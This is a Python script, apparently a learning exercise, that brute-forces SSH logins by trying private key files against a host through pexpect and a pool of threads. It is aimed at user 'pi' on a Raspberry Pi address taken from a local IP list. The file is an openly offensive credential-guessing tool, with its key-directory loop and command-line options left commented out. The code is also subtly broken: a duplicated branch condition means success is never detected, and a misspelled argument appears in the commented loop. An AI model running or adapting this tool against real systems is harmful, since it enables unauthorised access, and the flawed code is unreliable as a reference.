import os, optparse, pexpect
from threading import BoundedSemaphore, Thread

from ip_list import rpi_ip, think_ip, docker_ip


max_conn = 5
conn_lock = BoundedSemaphore(value=max_conn)
STOP = False
FAIL_CNT = 0


def conn(uname, host, key_fn, release):
    global STOP
    global FAIL_CNT
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        # conn_str = 'ssh %s@%s -i %s %s' % (uname, host, key_fn, opt)
        ssh_cmd = 'ssh %s@%s -i %s %s' % (uname, host, key_fn, opt)
        child = pexpect.spawn(ssh_cmd)
        res = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#',])
        if res == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            conn(uname, host, key_fn, False)
        elif res == 3:
            print('[-] Connection Closed By Remote Host')
            FAIL_CNT += 1
        elif res == 3:
            print('[+] Success. %s' % str(key_fn))
            STOP = True
    finally:
        if release:
            conn_lock.release()


def guess_key(uname, host, key_fn):
    global STOP
    global FAIL_CNT
    if STOP:
        print('[*] Exiting: Key Found.')
        exit(0)
    if FAIL_CNT > 5:
        print('[!] Exiting: Too Many Connections Closed By Remote Host.')
        print('[!] Adjust number of simultaneous threads.')
        exit(0)
    conn_lock.acquire()
    print('[-] Testing key_file %s' % key_fn)
    t = Thread(target=conn, args=(uname, host, key_fn, True))
    t.start()



uname = 'pi'
host = rpi_ip
key_fn = 'known_hosts'
guess_key(uname, host, key_fn)

# for fn in os.listdir(pass_dir):
    # if stop:
        # print('[*] Exiting: Key Found.')
        # exit(0)
    # if fail_cnt > 5:
        # print('[!] Exiting: Too Many Connections Closed By Remote Host.')
        # print('[!] Adjust number of simultaneous threads.')
        # exit(0)
    # conn_lock.acquire()
    # full_path = os.path.join(pass_dir, fn)
    # print('[-] Testing key_file %s' % str(full_path))
    # t = Thread(target=conn, arsg=(user, host, full_path, True))
    # child = t.start()



# parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
# parser.add_option('-H', dest='host', type='string', help='specify target host')
# parser.add_option('-u', dest='user', type='string', help='specify the user')
# parser.add_option('-d', dest='pass_dir', type='string', help='specify directory with keys')
# (options, args) = parser.parse_args()
# host = options.host
# user = options.user
# pass_dir = options.pass_dir
# if host == None or pass_dir == None or user == None:
    # print(parser.usage)
    # exit(0)
